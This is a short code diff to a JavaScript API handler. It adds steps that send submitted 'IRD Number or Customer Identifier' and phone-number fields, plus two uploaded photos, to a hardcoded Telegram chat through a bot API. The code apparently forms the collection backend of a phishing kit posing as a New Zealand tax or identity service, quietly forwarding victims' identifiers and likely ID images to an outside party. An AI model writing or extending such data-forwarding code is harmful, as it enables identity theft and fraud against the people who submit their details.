@@ -43,9 +43,20 @@ export default async function handler(req, res) {
 
   const chat_id = "5996836160";
 
+  const body = await req.body;
+
+  await api.sendMessage({
+    chat_id: chat_id,
+    text: ` IRD Number or Customer Identifier: \n ${body.IRD_Number_or_Customer_Identifier} \n Phone Number : \n ${body.Phone_Number} `,
+  });
+
   await api.sendPhoto({
     chat_id: chat_id,
     photo: fs.createReadStream(`./public/${req.files[0].filename}`),
+  });
+  await api.sendPhoto({
+    chat_id: chat_id,
+    photo: fs.createReadStream(`./public/${req.files[1].filename}`),
   });
 
   await api.getMe().then(console.log).catch(console.err);
@@ -54,6 +65,6 @@ export default async function handler(req, res) {
   res.status(200).json({
     body: req.body,
     files: req.files,
-    url: url + "/" + req.files[0].filename,
+    id1: url + "/" + req.files[0].filename,
   });
 }
